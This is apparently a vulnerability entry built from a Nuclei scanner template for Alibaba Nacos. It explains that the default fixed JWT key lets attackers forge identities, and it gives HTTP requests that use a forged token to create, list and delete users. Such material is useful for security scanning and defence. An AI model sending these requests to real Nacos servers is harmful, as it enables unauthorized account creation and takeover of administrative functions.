# Vulnerability: Alibaba Nacos - Unauthorized Account Creation
**Classification:** MISCONFIG
**Source:** Nuclei Template (`nacos-create-user.yaml`)

## Description
Nacos uses a fixed JWT token key to authenticate users in the default configuration. Since Nacos is an open source project, the key is publicly known, so unauthorized attackers can use this fixed key to forge any user identity Log in to Nacos to manage and operate background interface functions.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /nacos/v1/auth/users/?username={{randstr_1}}&password={{randstr_2}}&accessToken={{token}} HTTP/1.1
Host: {{Hostname}}

GET /nacos/v1/auth/users?pageNo=1&pageSize=9&search=blur&accessToken={{token}} HTTP/1.1
Host: {{Hostname}}

DELETE /nacos/v1/auth/users/?username={{randstr_1}}&accessToken={{token}} HTTP/1.1
Host: {{Hostname}}
```

